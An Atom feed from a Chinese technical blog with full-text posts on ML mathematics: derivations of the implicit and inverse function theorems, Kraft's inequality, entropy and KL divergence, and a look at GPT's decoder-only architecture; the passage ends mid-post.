<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>李三的剑谱</title>
  
  
  <link href="https://cl0und.xyz/atom.xml" rel="self"/>
  
  <link href="https://cl0und.xyz/"/>
  <updated>2025-05-25T09:28:38.904Z</updated>
  <id>https://cl0und.xyz/</id>
  
  <author>
    <name>李三（cl0und）</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ML的数学基石-隐函数定理（Implicit function theorem）</title>
    <link href="https://cl0und.xyz/2025/05/25/ML%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%9F%B3-%E9%9A%90%E5%87%BD%E6%95%B0%E5%AE%9A%E7%90%86%EF%BC%88implicit-function-theorem%EF%BC%89/"/>
    <id>https://cl0und.xyz/2025/05/25/ML%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%9F%B3-%E9%9A%90%E5%87%BD%E6%95%B0%E5%AE%9A%E7%90%86%EF%BC%88implicit-function-theorem%EF%BC%89/</id>
    <published>2025-05-25T08:19:35.000Z</published>
    <updated>2025-05-25T09:28:38.904Z</updated>
    
    <content type="html"><![CDATA[<p>通过之前博文学习的反函数定理，雅可比矩阵等推到出隐函数定理。</p><h2 id="隐函数定理的陈述">隐函数定理的陈述</h2><p>首先，让我们明确隐函数定理要说什么：</p><p><strong>隐函数定理</strong>：设 $ F: \mathbb{R}^{n+m} \to \mathbb{R}^m $ 是 $ C^1 $ 函数，点 $ (a,b) \in \mathbb{R}^n \times \mathbb{R}^m $ 满足：</p><ol><li>$ F(a,b) = 0 $</li><li>$ \frac{\partial F}{\partial y}(a,b) $ 是可逆的 $ m \times m $ 矩阵</li></ol><p>则存在 $ a $ 的邻域 $ U $ 和 $ b $ 的邻域 $ V $，以及 $ C^1 $ 函数 $ g: U \to V $，使得：</p><ul><li>$ g(a) = b $</li><li>对所有 $ x \in U $，有 $ F(x, g(x)) = 0 $</li></ul><h2 id="从反函数定理推导隐函数定理">从反函数定理推导隐函数定理</h2><h3 id="步骤-1：构造辅助函数">步骤 1：构造辅助函数</h3><p>定义函数 $ G: \mathbb{R}^{n+m} \to \mathbb{R}^{n+m} $：</p><p>$ G(x,y) = (x, F(x,y)) $</p><p>其中 $ x \in \mathbb{R}^n $，$ y \in \mathbb{R}^m $。</p><h3 id="步骤-2：计算雅可比矩阵">步骤 2：计算雅可比矩阵</h3><p>$ G $ 的雅可比矩阵是：</p><p>$ DG(x,y) = \begin{pmatrix}<br>I_n &amp; 0 \\<br>\frac{\partial F}{\partial x} &amp; \frac{\partial F}{\partial y}<br>\end{pmatrix} $</p><p>其中 $ I_n $ 是 $ n \times n $ 单位矩阵。</p><p>附录里面的给出这一步的详细推导。</p><h3 id="步骤-3：验证雅可比矩阵可逆">步骤 3：验证雅可比矩阵可逆</h3><p>在点 $ (a,b) $ 处，由于 $ \frac{\partial F}{\partial y}(a,b) $ 可逆，我们可以计算：</p><p>$ \det(DG(a,b)) = \det(I_n) \cdot \det\left(\frac{\partial F}{\partial y}(a,b)\right) \neq 0 $</p><p>因此 $ DG(a,b) $ 是可逆的。</p><h3 id="步骤-4：应用反函数定理">步骤 4：应用反函数定理</h3><p>由反函数定理，存在 $ (a,b) $ 的邻域 $ W $ 和 $ G(a,b) = (a,0) $ 的邻域 $ W’ $，使得 $ G: W \to W’ $ 有 $ C^1 $ 逆函数 $ G^{-1} $。</p><h3 id="步骤-5：构造隐函数">步骤 5：构造隐函数</h3><p>设 $ G^{-1}(x,z) = (H_1(x,z), H_2(x,z)) $，其中 $ H_1: W’ \to \mathbb{R}^n $，$ H_2: W’ \to \mathbb{R}^m $。</p><p>由于 $ G \circ G^{-1} = \text{原来映射出的值}$，我们有：$ G(H_1(x,z), H_2(x,z)) = (x,z) $</p><p>展开得：$ (H_1(x,z), F(H_1(x,z), H_2(x,z))) = (x,z) $</p><p>这给出：</p><ol><li>$ H_1(x,z) = x $</li><li>$ F(x, H_2(x,z)) = z $</li></ol><h3 id="步骤-6：定义隐函数">步骤 6：定义隐函数</h3><p>取 $ z = 0 $，定义 $ g(x) = H_2(x,0) $。</p><p>由于 $ G^{-1}(a,0) = (a,b) $，我们有 $ g(a) = H_2(a,0) = b $。</p><p>对于 $ x $ 在 $ a $ 的适当邻域内，由步骤5的第二个等式：</p><p>$ F(x, g(x)) = F(x, H_2(x,0)) = 0 $</p><h2 id="通俗理解整个过程">通俗理解整个过程</h2><p>如果 $G$ 有反函数 $G^{-1}$，那么：</p><ul><li>给定 $(x, 0)$，$G^{-1}$ 能告诉我们对应的 $(x, y)$</li><li>这个对应中的$y$ 正好满足$F(x, y) = 0$。</li></ul><h1>附录：推导DG(x,y)的左上角为什么是单位矩阵</h1><p>我来详细推导为什么雅可比矩阵 $ DG(x,y) $ 的左上角是单位矩阵 $ I_n $。</p><h2 id="回顾函数定义">回顾函数定义</h2><p>我们定义了函数 $ G: \mathbb{R}^{n+m} \to \mathbb{R}^{n+m} $：</p><p>$ G(x,y) = (x, F(x,y)) $</p><p>其中：</p><ul><li>$ x = (x_1, x_2, …, x_n) \in \mathbb{R}^n $</li><li>$ y = (y_1, y_2, …, y_m) \in \mathbb{R}^m $</li><li>$ F: \mathbb{R}^{n+m} \to \mathbb{R}^m $</li></ul><h2 id="分解-G-的分量">分解 $ G $ 的分量</h2><p>我们可以将 $ G $ 写成分量形式：</p><p>$ G(x,y) = \begin{pmatrix}<br>g_1(x,y) \\<br>g_2(x,y) \\<br>\vdots \\<br>g_n(x,y) \\<br>g_{n+1}(x,y) \\<br>\vdots \\<br>g_{n+m}(x,y)<br>\end{pmatrix} = \begin{pmatrix}<br>x_1 \\<br>x_2 \\<br>\vdots \\<br>x_n \\<br>F_1(x,y) \\<br>\vdots \\<br>F_m(x,y)<br>\end{pmatrix} $</p><h2 id="计算雅可比矩阵的元素">计算雅可比矩阵的元素</h2><p>雅可比矩阵 $ DG(x,y) $ 的第 $ (i,j) $ 元素是 $ \frac{\partial g_i}{\partial x_j} $ 或 $ \frac{\partial g_i}{\partial y_k} $。</p><h3 id="对于前-n-行（-i-1-2-…-n-）：">对于前 $ n $ 行（$ i = 1, 2, …, n $）：</h3><p>由于 $ g_i(x,y) = x_i $，我们有：</p><ul><li>当 $ j \leq n $ 时：$ \frac{\partial g_i}{\partial x_j} = \frac{\partial x_i}{\partial x_j} = \begin{cases} 1 &amp; \text{如果 } i = j \ 0 &amp; \text{如果 } i \neq j \end{cases} $</li><li>当 $ j &gt; n $ 时（即对 $ y_k $ 求导）：$ \frac{\partial g_i}{\partial y_k} = \frac{\partial x_i}{\partial y_k} = 0 $</li></ul><h2 id="构造雅可比矩阵">构造雅可比矩阵</h2><p>因此，雅可比矩阵的形式是：</p><p>$ DG(x,y) = \begin{pmatrix}<br>\frac{\partial x_1}{\partial x_1} &amp; \cdots &amp; \frac{\partial x_1}{\partial x_n} &amp; \frac{\partial x_1}{\partial y_1} &amp; \cdots &amp; \frac{\partial x_1}{\partial y_m} \\<br>\vdots &amp; \ddots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\<br>\frac{\partial x_n}{\partial x_1} &amp; \cdots &amp; \frac{\partial x_n}{\partial x_n} &amp; \frac{\partial x_n}{\partial y_1} &amp; \cdots &amp; \frac{\partial x_n}{\partial y_m} \\<br>\frac{\partial F_1}{\partial x_1} &amp; \cdots &amp; \frac{\partial F_1}{\partial x_n} &amp; \frac{\partial F_1}{\partial y_1} &amp; \cdots &amp; \frac{\partial F_1}{\partial y_m} \\<br>\vdots &amp; \ddots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\<br>\frac{\partial F_m}{\partial x_1} &amp; \cdots &amp; \frac{\partial F_m}{\partial x_n} &amp; \frac{\partial F_m}{\partial y_1} &amp; \cdots &amp; \frac{\partial F_m}{\partial y_m}<br>\end{pmatrix} $</p><p>代入我们计算的值：</p><p>$ DG(x,y) = \begin{pmatrix}<br>1 &amp; 0 &amp; \cdots &amp; 0 &amp; 0 &amp; \cdots &amp; 0 \\<br>0 &amp; 1 &amp; \cdots &amp; 0 &amp; 0 &amp; \cdots &amp; 0 \\<br>\vdots &amp; \vdots &amp; \ddots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\<br>0 &amp; 0 &amp; \cdots &amp; 1 &amp; 0 &amp; \cdots &amp; 0 \\<br>\frac{\partial F_1}{\partial x_1} &amp; \cdots &amp; \frac{\partial F_1}{\partial x_n} &amp; \frac{\partial F_1}{\partial y_1} &amp; \cdots &amp; \frac{\partial F_1}{\partial y_m} \\<br>\vdots &amp; \ddots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots \\<br>\frac{\partial F_m}{\partial x_1} &amp; \cdots &amp; \frac{\partial F_m}{\partial x_n} &amp; \frac{\partial F_m}{\partial y_1} &amp; \cdots &amp; \frac{\partial F_m}{\partial y_m}<br>\end{pmatrix} $</p><p>这就是为什么左上角是 $ n \times n $ 单位矩阵 $ I_n $，右上角是 $ n \times m $ 零矩阵。</p>]]></content>
    
    
    <summary type="html">Implicit function theorem</summary>
    
    
    
    
    <category term="ML" scheme="https://cl0und.xyz/tags/ML/"/>
    
    <category term="Math" scheme="https://cl0und.xyz/tags/Math/"/>
    
  </entry>
  
  <entry>
    <title>Does GPT&#39;s &#39;decoder-only&#39; architecture mean it consists of only a decoder?</title>
    <link href="https://cl0und.xyz/2025/05/24/GPT%E7%9A%84decoder-only%E6%98%AF%E5%8F%AA%E6%9C%89decoder%E5%90%97/"/>
    <id>https://cl0und.xyz/2025/05/24/GPT%E7%9A%84decoder-only%E6%98%AF%E5%8F%AA%E6%9C%89decoder%E5%90%97/</id>
    <published>2025-05-23T16:20:00.000Z</published>
    <updated>2025-05-23T16:41:42.375Z</updated>
    
    <content type="html"><![CDATA[<p><strong>GPT的decoder-only是只有decoder吗？</strong></p><p>事情的起因是我和朋友争论GPT模型到底有没有encoder。他认为GPT或类似的模型其实有一个很小的encoder，并且encoder和decoder之间会有cross attention。而我的观点则是GPT只有decoder部分，没有encoder。</p><p>于是有了这篇论文考古。</p><p><strong>GPT</strong></p><p>论文链接：<a href="https://cdn.openai.com/research-covers/language-unsupervised/language%5C_understanding%5C_paper.pdf">https://cdn.openai.com/research-covers/language-unsupervised/language\_understanding\_paper.pdf</a></p><p><strong>GPT 1.0</strong></p><p>GPT1.0分为训练和微调</p><p>训练</p><p><img src="image1.png" alt=""></p><p>微调</p><p><img src="image2.png" alt=""></p><p><img src="image3.png" alt=""></p><p>训练就是纯预测（优化一个目标函数），微调是同时做预测和分类（作者发现这样泛化性更好），优化目标为一组目标函数的和。</p><p>架构图可以到，就是只用了解码器，没有用编码器。</p><p><img src="image4.png" alt=""></p><p>论文中谈及架构的时候提到了引用34和62。说他们使用的decoder是来自transformer的一个变体。</p><p><a href="https://arxiv.org/pdf/1801.10198">GENERATING WIKIPEDIA BY SUMMARIZING LONG<br>SEQUENCES</a></p><p>Attention is all you need.</p><p>34的文章提出了一个decoder-only的架构，用来生成像维基百科一样的文章，作者认为用decoder-only能够关注更长的序列，这比常见的在序列转换任务中使用的编码器—解码器架构所能处理的序列要长得多。在引言部分和模型示例图可以看到他们模型只包含deocder.</p><p><img src="image5.png" alt=""></p><p><img src="image6.png" alt=""></p><p><img src="image7.png" alt=""></p><p>作者仅以不做了实验发现，比起encoder-decoder架构，decoder-only能微量提点，但是能处理的长度显著增加。</p><p><img src="image8.png" alt=""></p><p><strong>那么原来做cross attention那一层去哪里了？</strong></p><p><strong>在GPT1.0和它引用的论文里面是直接删掉了。只有masked multi-head<br>attention</strong></p><p><strong>GPT 2.0</strong></p><p>那在GPT2.0, 3.0用了吗？</p><p>Language Models are Unsupervised Multitask Learners</p><p><a href="https://cdn.openai.com/better-language-models/language%5C_models%5C_are%5C_unsupervised%5C_multitask%5C_learners.pdf">https://cdn.openai.com/better-language-models/language\_models\_are\_unsupervised\_multitask\_learners.pdf</a></p><p>GPT2.0在模型描述里面提到只在GPT1.0上做了微小改动，如果加了encoder应该属于模型大变化，应该会提到。</p><p><img src="image9.png" alt=""></p><p><img src="image10.png" alt=""></p><p>从源码里面看就是decoder-only<br><a href="https://github.com/openai/gpt-2/blob/master/src/model.py">https://github.com/openai/gpt-2/blob/master/src/model.py</a></p><p><strong>GPT 3.0</strong></p><p>Language Models are Few-Shot Learners</p><p><a href="https://arxiv.org/pdf/2005.14165">https://arxiv.org/pdf/2005.14165</a></p><p>提到架构和GPT2.0一样</p><p><img src="image11.png" alt=""></p><p><strong>GPT 4.0</strong></p><p>CloseAI的技术报告没有提模型细节，一种比较可靠的说法是他们要做多模态所以引入的ViT或者clip之类的技术理解媒体文件。但是这里我猜应该是只是做完embedding和文字的embedding一起输入，不能算是有&quot;cross-attention&quot;的encoder。</p><p><img src="image12.png" alt=""></p><p><img src="image13.png" alt=""></p><p><strong>Decoder only有什么好处？</strong></p><p>这里借用<a href="https://www.zhihu.com/question/588325646/answer/3357252612?s_r=0&amp;utm_medium=social&amp;utm_source=wechat_session">知乎这里的讨论</a><br>重新梳理一下。</p><p><strong>注意力机制的数学特性（苏剑林观点）</strong></p><p>**核心观点：**双向注意力容易退化为低秩，而因果注意力必然满秩。</p><p><strong>详细解释与例子：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">双向注意力示例</span><br><span class="line">句子：&quot;我爱北京天安门&quot;</span><br><span class="line">双向注意力矩阵（简化示例）</span><br><span class="line">[</span><br><span class="line">[0.2, 0.2, 0.2, 0.2, 0.2], &quot;我&quot;看所有词</span><br><span class="line">[0.2, 0.2, 0.2, 0.2, 0.2], &quot;爱&quot;看所有词</span><br><span class="line">[0.2, 0.2, 0.2, 0.2, 0.2], &quot;北京&quot;看所有词</span><br><span class="line">[0.2, 0.2, 0.2, 0.2, 0.2], &quot;天安&quot;看所有词</span><br><span class="line">[0.2, 0.2, 0.2, 0.2, 0.2], &quot;门&quot;看所有词</span><br><span class="line">]</span><br><span class="line">容易退化为低秩：所有行向量相似</span><br><span class="line">因果注意力示例（decoder-only）</span><br><span class="line">[</span><br><span class="line">[1.0, 0, 0, 0, 0], &quot;我&quot;只看自己</span><br><span class="line">[0.5, 0.5, 0, 0, 0], &quot;爱&quot;看&quot;我&quot;和自己</span><br><span class="line">[0.3, 0.3, 0.4, 0, 0], &quot;北京&quot;看前面的词</span><br><span class="line">[0.2, 0.2, 0.3, 0.3, 0], &quot;天安&quot;看前面的词</span><br><span class="line">[0.2, 0.2, 0.2, 0.2, 0.2], &quot;门&quot;看所有前面的词</span><br><span class="line">]</span><br><span class="line">下三角矩阵，必然满秩，表达能力更强</span><br></pre></td></tr></table></figure><p>如果注意力矩阵变成低秩，相当于模型&quot;眼里看到的东西都一样&quot;，很多不同的位置/内容其实被糊成了一坨，没法细致地区分信息。</p><p><strong>预测任务难度与泛化能力（@yili观点）</strong></p><p>**核心观点：**更难的预测任务促使模型学习更好的通用表征。</p><p><strong>具体例子：</strong></p><p>预测&quot;北京&quot;这个词时：</p><p>Encoder-Decoder：可以看到完整句子&quot;我爱[MASK]天安门&quot;，从两边获取信息</p><p>Decoder-Only：只能看到&quot;我爱&quot;，必须从更少的信息中推断</p><p>这种&quot;信息饥渴&quot;迫使模型：</p><p>学习更强的语言模型能力</p><p>更好地理解词序和语法结构</p><p>形成更通用的表征</p><p><strong>上下文学习的天然优势（@mimimumu观点）</strong></p><p>**核心观点：**Decoder-only架构让prompt能直接作用于每一层。</p><p><strong>Few-shot学习示例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入你给出的格式去掉多余斜线，改成：</span><br><span class="line"></span><br><span class="line">问：什么是机器学习？</span><br><span class="line">答：机器学习是让计算机从数据中学习的技术。</span><br><span class="line"></span><br><span class="line">问：什么是深度学习？</span><br><span class="line">答：[模型生成]</span><br></pre></td></tr></table></figure><p>在Decoder-only中：</p><p>每个token的表示逐层构建时，都能直接参考前面的示例</p><p>Prompt信息像&quot;隐式微调&quot;一样影响每一层的计算</p><p>而Encoder-Decoder需要先编码完整输入，再解码，信息传递路径更长。</p><p><strong>隐式位置编码特性</strong></p><p>**核心观点：**因果注意力天然具有位置敏感性。</p><p><strong>对比例子：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">没有位置编码的双向注意力</span><br><span class="line">&quot;我爱你&quot; 和 &quot;你爱我&quot; 可能产生相似的表示</span><br><span class="line"></span><br><span class="line">因果注意力（即使没有显式位置编码）</span><br><span class="line">&quot;我爱你&quot;：</span><br><span class="line"></span><br><span class="line">&quot;我&quot;：只看自己</span><br><span class="line">&quot;爱&quot;：看&quot;我&quot;+&quot;爱&quot;</span><br><span class="line">&quot;你&quot;：看&quot;我&quot;+&quot;爱&quot;+&quot;你&quot;</span><br><span class="line">&quot;你爱我&quot;：</span><br><span class="line"></span><br><span class="line">&quot;你&quot;：只看自己</span><br><span class="line">&quot;爱&quot;：看&quot;你&quot;+&quot;爱&quot;</span><br><span class="line">&quot;我&quot;：看&quot;你&quot;+&quot;爱&quot;+&quot;我&quot;</span><br><span class="line">表示完全不同，天然区分语序</span><br></pre></td></tr></table></figure><p><strong>KV-Cache复用机制</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">第一轮</span><br><span class="line">用户：&quot;介绍一下北京&quot;</span><br><span class="line">模型：生成回答，缓存所有KV</span><br><span class="line"></span><br><span class="line">第二轮</span><br><span class="line">用户：&quot;它的人口有多少？&quot;</span><br><span class="line"></span><br><span class="line">Decoder-only：直接复用第一轮的KV-Cache</span><br><span class="line">只需计算新输入的KV，效率极高</span><br><span class="line"></span><br><span class="line">Encoder-Decoder：需要重新编码整个上下文</span><br><span class="line">因为encoder看到的是完整输入，任何改变都需要重新计算</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">事情的起因是我和朋友争论GPT模型到底有没有encoder。他认为GPT或类似的模型其实有一个很小的encoder，并且encoder和decoder之间会有cross attention。而我的观点则是GPT只有decoder部分，没有encoder。</summary>
    
    
    
    
    <category term="ML" scheme="https://cl0und.xyz/tags/ML/"/>
    
  </entry>
  
  <entry>
    <title>ML的信息论基石-kraft不等式，信息熵，KL散度</title>
    <link href="https://cl0und.xyz/2025/05/03/ML%E7%9A%84%E4%BF%A1%E6%81%AF%E8%AE%BA%E5%9F%BA%E7%9F%B3-kraft%E4%B8%8D%E7%AD%89%E5%BC%8F%EF%BC%8C%E4%BF%A1%E6%81%AF%E7%86%B5%EF%BC%8CKL%E6%95%A3%E5%BA%A6/"/>
    <id>https://cl0und.xyz/2025/05/03/ML%E7%9A%84%E4%BF%A1%E6%81%AF%E8%AE%BA%E5%9F%BA%E7%9F%B3-kraft%E4%B8%8D%E7%AD%89%E5%BC%8F%EF%BC%8C%E4%BF%A1%E6%81%AF%E7%86%B5%EF%BC%8CKL%E6%95%A3%E5%BA%A6/</id>
    <published>2025-05-03T14:51:17.000Z</published>
    <updated>2025-05-25T09:28:52.042Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、基本名词与概念">一、基本名词与概念</h2><h3 id="1-前缀码与前缀自由码">1. 前缀码与前缀自由码</h3><ul><li><strong>前缀码</strong>：没有一个码字是另一个码字的前缀。例如霍夫曼码。</li><li><strong>重要性</strong>：前缀码满足即时唯一可译性（译码时不会二义并且即时解码AA）。</li></ul><hr><h3 id="2-Kraft不等式">2. Kraft不等式</h3><p>Kraft不等式是信息论中关于前缀编码（或者说前缀码树/二叉树）的一个重要结论。它说明任意一组前缀码的码长 $ l_1, l_2, \ldots, l_n $ 必须满足</p><p>$ \sum_{i=1}^n 2^{-l_i} \leq 1 $</p><p>反之，只有满足这个不等式才有可能存在对应的前缀码。</p><h4 id="Kraft不等式证明">Kraft不等式证明</h4><p><strong>必要性（任何前缀码的一组码长都满足Kraft不等式）：</strong></p><p>设$ D $为二叉树，每个码字可表示为树的一条路径。</p><ul><li>码长为 $ l_k $ 的码字在树的第 $ l_k $ 层，是一个叶子。</li><li>每一层最多有 $ 2^{l_k} $ 个节点，叶子节点互不重叠。</li><li>所有码字实际占用的叶子数之和</li></ul><p>$ \sum_{i=1}^n 2^{L-l_i} $</p><p>其中 $ L $ 为所有码长的最大值。</p><ul><li>总叶子数为 $ 2^L $</li><li>所以有：$ \sum_{i=1}^n 2^{L-l_i} \leq 2^L \implies \sum_{i=1}^n 2^{-l_i} \leq 1 $</li></ul><p><em>补充：什么叫码字实际占用的叶子数之和？</em></p><p><em>假设我们最大码长是 <em>$ L $</em>，再看一个码字长度是 <em>$ l $</em>。</em></p><ul><li><em>一个长度为 <em>$ l $</em> 的码字，从根到它走了 <em>$ l $</em> 步。</em></li><li><em>如果继续从它往下走，走满长度 <em>$ L $</em>，还能走 <em>$ (L-l) $</em> 步。</em></li><li><em>每多一步可分岔两路，</em>$ (L-l) $_ 步一共可以分成 <em>$ 2^{L-l} $</em> 个不同的终点（叶子）。_</li><li><em>所以长度为 <em>$ l $</em> 的码字，等价于在最大深度 <em>$ L $</em> 处“占用”了 <em>$ 2^{L-l} $</em> 个叶子。</em></li></ul><p><strong>充分性（只要码长满足Kraft不等式，就能构造前缀码）：</strong></p><ul><li>将所有 $ l_i $ 从小到大排序。</li><li>从编码树顶部出发，依次分配以 $ l_i $ 为长度的唯一路径（即叶子结点）；因Kraft不等式成立，子树不会重叠，必能分配完全部码字且不会出现有一个码字是其他码字前缀的情况。</li><li>具体可采用“字典树”方式依次分配。</li></ul><hr><h3 id="3-信息熵（Shannon-Entropy）">3. 信息熵（Shannon Entropy）</h3><p>对离散信源$ X $（概率分布为 $ {p_1, p_2, …, p_n} $）：</p><ul><li>$ H(X) = -\sum_{i=1}^n p_i \log_2 p_i $</li><li>这个数是用拉个朗日乘数法得到的，可以参考下面 “最优编码定理”。</li><li>熵是<strong>最优平均编码长度的下界</strong>。</li></ul><hr><h3 id="4-最优编码定理">4. 最优编码定理</h3><p>这里摘要这个视频里面的证明：<a href="https://www.bilibili.com/video/BV1sV411k7qc/">https://www.bilibili.com/video/BV1sV411k7qc/</a><br>平均码长的最小值为熵或近似熵（$ \lceil l_i \rceil $ 情况下高于熵但不会超过1bit）：</p><ul><li>$ H(X) \leq L^* &lt; H(X) + 1 $</li></ul><p>假设我们要对一个文章中的字母用前缀码进行编码，那么如何让整个文章的编码最短的问题就转换为使得下图的中的E(L)变得最小。<br><img src="image2.png" alt=""><br>目标函数有了，优化的约束就是Kraft不等式（满足前缀码的充要条件）。<br><img src="image3.png" alt=""><br>这里选择用拉格朗日乘数法来求解，但是拉格朗日乘数法只适合解等式不能解不等式。所以先考虑等式的情况。<br><img src="image4.png" alt=""><br><img src="image5.png" alt=""></p><p>$l_i = - \log_2 p_i$，这里的$l_i$就是每个字母对应的码长了。因为码长不能是小数，所以要进行上取整。</p><p><img src="image.png" alt=""></p><ul><li>相关推导正是“在Kraft约束下极小化码长”——见“熵的最优性推导”小节。</li></ul><hr><h3 id="5-交叉熵与KL散度">5. 交叉熵与KL散度</h3><ul><li><strong>交叉熵</strong> $ H(P, Q) $：用$ Q $分布编码真实分布$ P $的信息平均长度：</li></ul><p>$ H(P, Q) = -\sum_x p(x) \log q(x) $</p><ul><li><strong>KL散度</strong>（相对熵）：</li></ul><p>$ D_{KL}(P | Q) = \sum_x p(x) \log \frac{p(x)}{q(x)} = H(P, Q) - H(P) $</p><ul><li>表示用$ Q $代替$ P $时的“额外码长”。</li></ul><hr><h2 id="二、各部分逻辑关系">二、各部分逻辑关系</h2><ol><li><strong>Kraft不等式</strong> —— 判断前缀码能否存在及如何分配码长；</li><li><strong>最优编码定理</strong> —— 满足Kraft不等式的最优平均编码长度的理论极限；</li><li><strong>信息熵</strong> —— 度量信源不确定性，也限制度量最优编码效率；</li><li><strong>交叉熵/相对熵 (KL散度)</strong> —— 两个概率分布编码效率的度量，机器学习损失函数常用。</li></ol><hr><h3 id="简要表格">简要表格</h3><table><thead><tr><th>概念</th><th>数学表达</th><th>目的/意义</th></tr></thead><tbody><tr><td>Kraft不等式</td><td>$ \sum 2^{-l_i} \leq 1 $</td><td>判断能否分配码长形成前缀码</td></tr><tr><td>信息熵</td><td>$ H(X) = -\sum p_i \log_2 p_i $</td><td>不确定性度量、最优平均码长下界</td></tr><tr><td>最优编码定理</td><td>$ H(X) \leq L^* &lt; H(X)+1 $</td><td>连接实际编码与熵的极限</td></tr><tr><td>交叉熵</td><td>$ H(P, Q) = -\sum p(x)\log q(x) $</td><td>“用Q表示P”的平均信息长度</td></tr><tr><td>KL散度</td><td>$D_{KL}(P|Q)=\sum p(x)\log\frac{p(x)}{q(x)}$</td><td>Q相对P的“额外消耗”，度量分布差异</td></tr></tbody></table><h1>参考</h1><p><a href="https://www.bilibili.com/video/BV1sV411k7qc/">https://www.bilibili.com/video/BV1sV411k7qc/</a></p>]]></content>
    
    
    <summary type="html">Kraft Inequality, Information Entropy, KL Divergence</summary>
    
    
    
    
    <category term="ML" scheme="https://cl0und.xyz/tags/ML/"/>
    
    <category term="Information theory" scheme="https://cl0und.xyz/tags/Information-theory/"/>
    
  </entry>
  
  <entry>
    <title>ML的数学基石-逆函数定理（Inverse function theorem）</title>
    <link href="https://cl0und.xyz/2025/03/05/ML%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%9F%B3-%E5%8F%8D%E5%87%BD%E6%95%B0%E5%AE%9A%E7%90%86%EF%BC%88Inverse-function-theorem%EF%BC%89/"/>
    <id>https://cl0und.xyz/2025/03/05/ML%E7%9A%84%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%9F%B3-%E5%8F%8D%E5%87%BD%E6%95%B0%E5%AE%9A%E7%90%86%EF%BC%88Inverse-function-theorem%EF%BC%89/</id>
    <published>2025-03-04T16:08:01.000Z</published>
    <updated>2025-05-25T09:28:48.564Z</updated>
    
    <content type="html"><![CDATA[<h1>前置知识</h1><h3 id="单射，满射，双射">单射，满射，双射</h3><ul><li><strong>单射</strong>：每个输入值有唯一的输出值，不会有两个不同的输入映射到同一个输出。</li><li><strong>满射</strong>：每个输出值都至少有一个输入值与之对应。</li><li><strong>双射</strong>：既是单射又是满射，即每个输入值有唯一的输出值，且每个输出值都有唯一的输入值。</li></ul><h3 id="雅可比矩阵-Jacobian-Matrix">雅可比矩阵 (Jacobian Matrix)</h3><p>雅可比矩阵是描述多元函数在某一点处的局部线性近似的矩阵形式，具体定义见前文。</p><hr><h1>预备知识 - 完备度量空间</h1><h3 id="1-1-度量空间的基本定义">1.1 度量空间的基本定义</h3><p>一个<strong>度量空间</strong>是一个集合 $S$ 配备了一个“度量函数” $d: S \times S \to \mathbb{R}$，它满足以下性质（即定义“距离”的规则）：</p><ol><li><strong>非负性</strong>：<br>$$<br>d(x, y) \geq 0, \quad \text{且当且仅当 } x = y, \ d(x, y) = 0;<br>$$</li><li><strong>对称性</strong>：<br>$$<br>d(x, y) = d(y, x);<br>$$</li><li><strong>三角不等式</strong>：对任意 $x, y, z \in S$，有<br>$$<br>d(x, z) \leq d(x, y) + d(y, z).<br>$$<br>度量 $d(x, y)$ 定义了集合 $S$ 中任意两点之间的距离，使 $S$ 成为一个度量空间。</li></ol><hr><h3 id="1-2-完备性：柯西序列的收敛性">1.2 完备性：柯西序列的收敛性</h3><p>一个度量空间 $(S, d)$ 是<strong>完备的</strong>，当且仅当空间内的每个<strong>柯西序列</strong>都收敛于 $S$ 中的一个点。</p><h4 id="什么是柯西序列？">什么是柯西序列？</h4><p>一个序列 ${x_n} \subseteq S$ 是一个<strong>柯西序列</strong>，如果它满足以下条件：</p><ul><li>对于任意的 $\varepsilon &gt; 0$，存在一个整数 $N &gt; 0$，使得当 $m, n \geq N$ 时，$$d(x_m, x_n) &lt; \varepsilon.$$</li></ul><p>简单来说，在柯西序列中，序列的元素在这个空间中变得越来越“接近彼此”。例如：</p><ul><li>如果序列越来越“集中”到一个点附近，就是柯西序列（无论这个点是否是空间内部的点）。</li><li>注意：柯西序列的定义不要求你事先知道收敛点，仅要求元素之间的距离无限趋近于零。</li></ul><h4 id="示例">示例</h4><ul><li><strong>正例</strong>：序列 $x_n = 1 + \frac{1}{n}$ 是一个柯西序列。</li><li><strong>反例</strong>：对于非完备的空间（例如 $\mathbb{Q}$ 上），可能存在柯西序列无法收敛到 $\mathbb{Q}$ 内的一个点。例如，序列 $x_n = 1, 1.4, 1.414, 1.4142, \dots$ 